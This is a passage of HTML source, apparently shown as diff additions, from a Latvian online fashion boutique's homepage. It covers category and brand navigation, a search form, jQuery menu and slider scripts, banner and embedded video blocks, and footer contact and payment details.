="http://stile-vero.com/women/women-clothe/bluzes.html"><span>Blūzes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/skirts.html"><span>Svārki</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/brjuki.html"><span>Bikses</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/jeans.html"><span>Džinsi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/shorts.html"><span>Šorti</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/jackets.html"><span>Žaketes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/sweaters.html"><span>Džemperi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/vest.html"><span>Vestes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/dresses.html"><span>Kleitas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/dungarees.html"><span>Kombinzoni</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-clothe/cardigans.html"><span>Jakas</span></a></li></ul></li><li class="level1 parent" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-bags.html"><span>Somas</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-bags/bags.html"><span>Somas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/women-bags/clutch-bags.html"><span>Klatči</span></a></li></ul></li><li class="level1 parent" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories.html"><span>Aksesuāri</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/cosmetics-cases.html"><span>Kosmētikas somiņas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/wallets.html"><span>Maki</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/gloves-fratelli-forino.html"><span>Cimdi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/belts.html"><span>Siksnas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/scarves.html"><span>Šalles</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/umbrellas.html"><span>Lietussargi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/women/accessories/other.html"><span>Cits </span></a></li></ul></li><li class="level1 thumbnail-image-area" style="position: relative;"><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/np_thumb2.gif" style="display: none;" /></li></ul></li><li class="level0 parent" thumb_image="no-image"><a href ="http://stile-vero.com/men.html"><span>VĪRIEŠIEM</span></a><span class="plus"></span><ul class="level1"><li class="level1 first parent" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes.html"><span>Apavi</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes/laced-shoes.html"><span>Kurpes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes/boots.html"><span>Zābaki</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes/moccasins.html"><span>Mokasīni</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes/sneakers.html"><span>Kedas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes/sandals.html"><span>Sandales </span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/shoes/loafers.html"><span>Loferi</span></a></li></ul></li><li class="level1 parent" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes.html"><span>APĢĒRBI</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/coats.html"><span>Mēteļi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/jackets.html"><span>Virsjakas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/jackets-5.html"><span>Žaketes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/shirts.html"><span>Krekli</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/t-shirts.html"><span>T-krekli</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/trousers.html"><span>Bikses</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/jeans.html"><span>Džinsi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/shorts.html"><span>Šorti</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/jumpers.html"><span>Džemperi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/cardigans.html"><span>Jakas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/polo.html"><span>Polo</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/vest.html"><span>Vestes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/clothes/shuby.html"><span>Kažoki</span></a></li></ul></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/men/bags.html"><span>Somas</span></a></li><li class="level1 parent" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories.html"><span>Aksesuāri</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/wallets.html"><span>Maki</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/gloves.html"><span>Cimdi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/belts.html"><span>Siksnas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/cosmetics-bags.html"><span>Kosmētikas somiņas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/cases.html"><span>Keisi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/scarves.html"><span>Šalles</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/umbrellas.html"><span>Lietussargi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/men/accessories/other.html"><span>Cits</span></a></li></ul></li><li class="level1 thumbnail-image-area" style="position: relative;"><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/np_thumb2.gif" style="display: none;" /></li></ul></li><li class="level0 parent" thumb_image="no-image"><a href ="http://stile-vero.com/combined-outfits.html"><span>KOMBINĒTIE TĒRPI</span></a><span class="plus"></span><ul class="level1"><li class="level1 first" thumb_image="no-image"><a href ="http://stile-vero.com/combined-outfits/men.html"><span>VĪRIEŠIEM</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/combined-outfits/women.html"><span>SIEVIETĒM</span></a></li><li class="level1 thumbnail-image-area" style="position: relative;"><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/np_thumb2.gif" style="display: none;" /></li></ul></li><li class="level0 parent" thumb_image="no-image"><a href ="http://stile-vero.com/brands.html"><span>ZĪMOLI</span></a><span class="plus"></span><ul class="level1"><li class="level1 first" thumb_image="no-image"><a href ="http://stile-vero.com/brands/moreschi-2883.html"><span>Moreschi</span></a></li><li class="level1" thumb_image="http://stile-vero.com/media/catalog/category/sebastian.png"><a href ="http://stile-vero.com/brands/sebastian-milano.html"><span>Sebastian Milano</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/fratelli-rossetti-2908.html"><span>Fratelli Rossetti</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/moschino.html"><span>Moschino</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/gianfranco-lotti-2673.html"><span>Gianfranco Lotti</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/serapian-milano-2695.html"><span>Serapian Milano</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/doriani.html"><span>Doriani </span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/cruciani.html"><span>Cruciani</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/dondup.html"><span>Dondup</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/ballin-2805.html"><span>Ballin </span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/rodo-2800.html"><span>Rodo</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/nana-nucci.html"><span>Nana Nucci</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/casadei-2389.html"><span>Casadei</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/renzi.html"><span>R&Renzi</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/giorgio-fabiani.html"><span>Giorgio Fabiani</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/fabi.html"><span>Fabi</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/daniela-bizzi.html"><span>Daniela Bizzi</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/plinio-visona.html"><span>Plinio Visona</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/gloves-fratelli-forino.html"><span>GLOVES by Fratelli Forino </span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/pollini.html"><span>Pollini</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/iceberg.html"><span>Iceberg</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/stemar.html"><span>STEMAR</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/roberto-cavalli.html"><span>Roberto Cavalli</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/zerosettaneta-studio.html"><span>Zerosettaneta Studio</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/jean-paul-gaultier.html"><span>Jean Paul Gaultier</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/ferre-milano.html"><span>Ferre Milano</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/chantal-thomass-paris.html"><span>Chantal Thomass Paris</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/guy-de-jean.html"><span>Guy de Jean</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/john-richmond.html"><span>John Richmond</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/kalliste.html"><span>Kalliste</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/alessandro-dellacqua.html"><span>Alessandro Dell'acqua</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/ripani.html"><span>RIPANI</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/anpel.html"><span>ANPEL</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/gabriel-pisani-2820.html"><span>Gabriel Pisani</span></a></li><li class="level1" thumb_image="no-image"><a href ="http://stile-vero.com/brands/anton-heunis.html"><span>ANTON HEUNIS</span></a></li><li class="level1" thumb_image="http://stile-vero.com/media/catalog/category/4405-800w.jpg"><a href ="http://stile-vero.com/brands/strenesse.html"><span>STRENESSE</span></a></li><li class="level1 thumbnail-image-area" style="position: relative;"><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/np_thumb2.gif" style="display: none;" /></li></ul></li><li class="level0 parent" thumb_image="no-image"><a href ="http://stile-vero.com/sale.html"><span>SALE</span></a><span class="plus"></span><ul class="level1"><li class="level1 first parent" thumb_image="no-image"><a href ="http://stile-vero.com/sale/women.html"><span>Sievietes</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/sale/women/obuvj.html"><span>Apavi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/sale/women/odezhda.html"><span>Drēbes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/sale/women/sumki.html"><span>Somas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/sale/women/aksesuari.html"><span>Aksesuāri</span></a></li></ul></li><li class="level1 parent" thumb_image="no-image"><a href ="http://stile-vero.com/sale/men.html"><span>Vīrieši</span></a><span class="plus"></span><ul class="level2"><li class="level2 first" thumb_image="no-image"><a href ="http://stile-vero.com/sale/men/obuvj.html"><span>Apavi</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/sale/men/odezhda.html"><span>Drēbes</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/sale/men/sumki.html"><span>Somas</span></a></li><li class="level2" thumb_image="no-image"><a href ="http://stile-vero.com/sale/men/aksesuari.html"><span>Aksesuāri</span></a></li></ul></li><li class="level1 thumbnail-image-area" style="position: relative;"><img src="http://stile-vero.com/skin/frontend/default/vigoshop/images/np_thumb2.gif" style="display: none;" /></li></ul></li><li class="level0" thumb_image="no-image"><a href ="http://stile-vero.com/gift-cards.html"><span>DĀVANU KARTES</span></a></li></ul>            <div class="for-desktop">
+                <div class="form-search for-not-tablet">
+    <form id="search_mini_form" action="http://stile-vero.com/catalogsearch/result/" method="get">
+        <input id="search" type="text" name="q" class="input-text" maxlength="128" placeholder="Meklēt..." />
+        <button type="submit" title="Meklēt" class="button"><span><span>Meklēt</span></span></button>
+        <script type="text/javascript">
+        //<![CDATA[
+        jQuery("#search").focus(function(){
+            jQuery(this).parent().children('button').addClass('active');
+        }).blur(function(){
+            jQuery(this).parent().children('button').removeClass('active');
+        });
+        //]]>
+        </script>
+    </form>
+    </div>
+    <div class="form-search for-tablet">
+    <form id="tb_search_mini_form" action="http://stile-vero.com/catalogsearch/result/" method="get">
+        <button type="submit" title="Meklēt" class="button btn-search" style="display: none;"><span><span>Meklēt</span></span></button>
+        <input id="tb_search" type="text" name="q" class="input-text" maxlength="128" placeholder="Enter text here..."  style="display: none;" />
+        <a class="btn-remove btn-remove2" href="javascript:void(0)" style="display: none;">Aizvērt</a>
+        <button type="button" title="Meklēt" class="button btn-search-flg"><span><span>Meklēt</span></span></button>
+        <script type="text/javascript">
+        //<![CDATA[
+        jQuery(".for-tablet button.btn-search-flg").click(function(){
+            jQuery(this).parent().children("button.btn-search-flg").hide();
+            jQuery(this).parent().children("button.btn-search").show();
+            jQuery(this).parent().children("#tb_search").show();
+            jQuery(this).parent().children("#tb_search").focus();
+            jQuery(this).parent().children("a.btn-remove").css('display','inline-block');
+            jQuery(".form-search.for-tablet").css("width","100%");
+        });
+        jQuery(".for-tablet a.btn-remove").click(function(){
+            jQuery(this).parent().children("button.btn-search-flg").show();
+            jQuery(this).parent().children("button.btn-search").hide();
+            jQuery(this).parent().children("#tb_search").hide();
+            jQuery(this).parent().children("a.btn-remove").hide();
+            jQuery(".form-search.for-tablet").css("width","30px");
+        });
+        //]]>
+        </script>
+    </form>
+    </div>
+
+            </div>
+        </nav>
+    </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    jQuery(document).ready(function(){
+        var scrolled = false;
+        jQuery(window).scroll(function(){
+            if(200<jQuery(window).scrollTop() && !scrolled){
+                jQuery('.navbar').addClass('sticky-menu').css('top','-50px').animate({top:'0px'}, 500);
+                scrolled = true;
+            }
+            if(200>jQuery(window).scrollTop() && scrolled){
+                jQuery('.navbar').removeClass('sticky-menu');
+                scrolled = false;
+            }
+        })
+        jQuery("#nav_custom li.level0").mouseover(function(){
+            if(jQuery(window).width() >= 768){
+                jQuery(this).children('ul.level1').fadeIn();
+            }
+            return false;
+        }).mouseleave(function(){
+            if(jQuery(window).width() >= 768){
+                jQuery(this).children('ul.level1').fadeOut();
+            }
+            return false;
+        });
+        jQuery("#nav_custom li span.plus").click(function(e){
+            e.stopPropagation();
+            if(jQuery(this).hasClass('expanded')){
+                jQuery(this).removeClass('expanded');
+                jQuery(this).parent().removeClass('expanded');
+                jQuery(this).parent().children('ul').slideUp();
+            } else {
+                jQuery(this).parent().parent().children('li.expanded').children('ul').slideUp();
+                jQuery(this).parent().parent().children('li.expanded').children('span.expanded').removeClass('expanded');
+                jQuery(this).parent().parent().children('li.expanded').removeClass('expanded');
+                jQuery(this).addClass('expanded');
+                jQuery(this).parent().addClass('expanded');
+                jQuery(this).parent().children('ul').slideDown();
+            }
+        });
+        /*
+        var flg = false;
+        jQuery("#nav_custom a").mouseover(function(){
+            var thumb_image = jQuery(this).parent().attr("thumb_image");
+            if(thumb_image != "no-image")
+                jQuery("#nav_custom li.thumbnail-image-area img").attr("src",thumb_image);
+        });
+        */
+    });
+//]]>
+</script>                <div class="main-container col1-layout">
+                        <div class="main container">
+                                <div class="col-main">
+                                        <div class="container">
+<div class="tp-banner-container " style="">
+    <div class="tp-banner" >
+<ul>
+<li style="text-align: justify;" data-transition="cube" data-slotamount="15" data-masterspeed="1500"><img src="http://stile-vero.com/media/wysiwyg/sale-PLINIO-VISONA-70.jpg" alt="" />
+<div class="tp-caption skewfromleftshort" style="z-index: 6;" data-x="center" data-y="center" data-speed="500" data-start="1000" data-endspeed="100">&nbsp;</div>
+</li>
+<li data-transition="fadetoleftfadefromright" data-slotamount="15" data-masterspeed="1500"><img style="vertical-align: middle;" src="http://stile-vero.com/media/wysiwyg/SALE.jpg" alt="slidebg1" data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat" /></li>
+<li data-transition="fadetoleftfadefromright" data-slotamount="15" data-masterspeed="1500">
+<div class="tp-caption sft" style="z-index: 6;" data-x="center" data-y="center" data-speed="500" data-start="1000" data-endspeed="100">
+<div class="caption-black-15"><img style="float: left;" src="http://stile-vero.com/media/wysiwyg/FullSizeRender_1.jpg" alt="nina" />&nbsp;</div>
+</div>
+</li>
+</ul>
+<div class="w69b-screencastify-mouse" style="-webkit-transform: translate(-100px, -100px) translateZ(0px);">&nbsp;</div>
+<div>&nbsp;</div>
+<div>&nbsp;</div>
+<p style="float: left;"><iframe src="https://www.youtube.com/embed/0-fWJXvyA3g" frameborder="0" width="540" height="315"></iframe></p>
+<p style="float: right;"><iframe src="https://www.youtube.com/embed/U19ySIZ-eh0" frameborder="0" width="540" height="315"></iframe></p>    <div class="tp-bannertimer"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+
+    var tpj=jQuery;
+    tpj.noConflict();
+
+    tpj(document).ready(function() {
+
+        tpj('.tp-banner').revolution({
+delay:9000,startheight:550,startwidth:'1170',onHoverStop:'on',hideThumbs:10,navigationType:'none',navigationArrows:'solo',navigationStyle:'square',navigationHAlign:'center',navigationVAlign:'center',touchenabled:'on',hideThumbsOnMobile:'off',hideBulletsOnMobile:'off',hideArrowsOnMobile:'off',fullWidth:'off',autoHeight:'off',fullScreenAlignForce:'off',forceFullWidth:'off',fullScreen:'off',shadow:0        });
+
+});
+</script>
+</div>
+<div class="container">
+    <div class="block-bestseller-home">
+        <div class="block-content">
+            <div class="category-products">
+            <ul class="products-grid">
+                                </ul>
+</div>
+            <script type="text/javascript">
+                // <![CDATA[
+                    jQuery(document).ready(function(){
+                        var window_size = jQuery(window).width();
+                        var bxslider;
+                        if(window_size<992 && window_size >= 768){
+                            bxslider=jQuery('.block-bestseller-home .products-grid').bxSlider({auto:false, autoStart:false, autoHover:false, mode:'horizontal', speed:1000, pager:false, minSlides: 2,  maxSlides: 2,  slideWidth: 225,  slideMargin: 20});
+                        } else if(window_size<768){
+                            bxslider=jQuery('.block-bestseller-home .products-grid').bxSlider({auto:false, autoStart:false, autoHover:false, mode:'horizontal', speed:1000, pager:false, minSlides: 1,  maxSlides: 1});
+                        }else {
+                            bxslider=jQuery('.block-bestseller-home .products-grid').bxSlider({auto:false, autoStart:false, autoHover:false, mode:'horizontal', speed:1000, pager:false, minSlides: 4,  maxSlides: 4,  slideWidth: 240,  slideMargin: 15});
+                        }
+
+                        jQuery(window).resize(function(e){
+                            e.preventDefault();
+                            var window_size = jQuery(window).width();
+                            var time_out;
+                            if(time_out) clearTimeout(time_out);
+                            time_out = setTimeout(function(){
+                                if(window_size<992 && window_size >= 768){
+                                    bxslider.reloadSlider({auto:false, autoStart:false, autoHover:false, mode:'horizontal', speed:1000, pager:false, minSlides: 2,  maxSlides: 2,  slideWidth: 225,  slideMargin: 20});
+                                } else if(window_size<768){
+                                    bxslider.reloadSlider({auto:false, autoStart:false, autoHover:false, mode:'horizontal', speed:1000, pager:false, minSlides: 1,  maxSlides: 1});
+                                }else {
+                                    bxslider.reloadSlider({auto:false, autoStart:false, autoHover:false, mode:'horizontal', speed:1000, pager:false, minSlides: 4,  maxSlides: 4,  slideWidth: 240,  slideMargin: 15});
+                                }
+                            }, 500);
+                        });
+                    });
+                // ]]>
+               </script>
+        </div>
+    </div>
+</div>
+                </div>
+                            </div>
+        </div>
+        <div class="container">
+    <div class="footer-cards">
+        <ul>
+            <li><img src="/skin/frontend/default/vigoshop/images/cards/visa-icon.png" title="Visa" alt="Visa"></li>
+            <li><img src="/skin/frontend/default/vigoshop/images/cards/mastercard-icon.png" title="Master" alt="Master"></li>
+            <li><img src="/skin/frontend/default/vigoshop/images/cards/maestro-icon.png" title="Maestro" alt="Maestro"></li>
+            <li><img src="/skin/frontend/default/vigoshop/images/cards/paypal-icon.png" title="Paypal" alt="Paypal"></li>
+            <li><img src="/skin/frontend/default/vigoshop/images/cards/dpd-paku-bode-icon.png" title="DPD" alt="DPD"></li>
+            <li><img src="/skin/frontend/default/vigoshop/images/cards/pickup-paku-bode-icon.png" title="Pickup" alt="Pickup"></li>
+        </ul>
+    </div>
+</div>
+<div class="footer-container">
+    <div class="footer">
+        <div class="container">
+                        <div class="row footer-middle">
+                            <div class="">
+                <div class="block">
+<div class="block-title"><strong><span>Par Stile Vero</span></strong></div>
+<div class="block-content">
+<ul class="links">
+<li><a href="http://stile-vero.com/about-us">Par mums</a></li>
+<li><a href="http://stile-vero.com/contacts">Sazināties</a></li>
+<li><a href="http://stile-vero.com/our-boutique">Mūsu salons</a></li>
+<li><a href="http://stile-vero.com/press">Prese</a></li>
+<li><a href="http://stile-vero.com/gift-cards">Dāvanu kartes</a></li>
+</ul>
+</div>
+</div>                </div>
+                            <div class="">
+                <div class="block">
+<div class="block-title"><strong><span>Klientu apkalpošana</span></strong></div>
+<div class="block-content">
+<ul class="links">
+<li><a href="http://stile-vero.com/how-to-shop">Kā iepirkties</a></li>
+<li><a href="http://stile-vero.com/how-to-pay">Kā apmaksāt</a></li>
+<li><a href="http://stile-vero.com/shipping">Piegāde</a></li>
+<li><a href="http://stile-vero.com/returns">Preces atgriešana</a></li>
+<li><a href="http://stile-vero.com/privacy-policy">Privātuma politika</a></li>
+</ul>
+</div>
+</div>                </div>
+                            <div class="">
+                <div class="block block-contactdetails">
+<div class="block-title"><strong><span>Kontaktinformācija</span></strong></div>
+<div class="block-content">
+<div class="row mobile">
+<div class="row-header">Tālrunis:</div>
+<div class="row-info">
+<p>Tel.: +371 67324282</p>
+<p>GSM: +371 25420045</p>
+</div>
+<div class="clear">&nbsp;</div>
+</div>
+<div class="row email">
+<div class="row-header">E-pasts:</div>
+<div class="row-info">
+<p>info@stile-vero.com</p>
+</div>
+<div class="clear">&nbsp;</div>
+</div>
+</div>
+</div>
+<div class="w69b-screencastify-mouse" style="-webkit-transform: translate(-100px, -100px) translateZ(0px);">&nbsp;</div>                </div>
+                        </div>
+            <script type="text/javascript">
+            //<![CDATA[
+                if(jQuery(".footer-middle").children('div').length > 0){
+                    jQuery(".footer-middle").children('div').addClass('col-sm-'+(12/jQuery(".footer-middle").children('div').length));
+                }
+            //]]
+            </script>
+                        <div class="split scroll-top"><a href="javascript:void(0)"></a></div>
+                        <div class="row footer-bottom">
+                <div class="col-sm-12">
+                    <div class="social-icons">
+<a href="https://www.facebook.com/StileVeroSalon?ref=hl" title="Facebook" class="facebook-icon">Facebook</a><a href="https://twitter.com/StileVero" title="Twitter" class="twitter-icon">Twitter</a><a href="https://instagram.com/stileverosalon/" title="Instagram" class="instagram-icon">Instagram</a></div>
+                    <address>© 2014 Stilevero. All Rights reserved.</address>
+<!--                    <div class="footer-store-switcher">
+                                        </div>-->
+                </div>
+            </div>
+                    </div>
+    </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    jQuery('.footer .scroll-top a').click(function(){
+        jQuery('html, body').animate({scrollTop: 0}, 600, "easeOutCubic");
+        return false;
+    });
+//]]
+</script>
+<div class="size-guide-block">
+    <div class="popup-title">
+        <h1>Izmēru saraksts</h1>
+        <div class="close-popup">X</div>
+    </div>
+    <div class="popup-content">
+        <p><img title="clothing_size_chart" src="http://stile-vero.com/media/wysiwyg/shoe_conversion_chart-3-page-001.jpg" alt="clothing_size_chart" /></p>    </div>
+</div>            </div>
+</div>
+</body>
+</html>
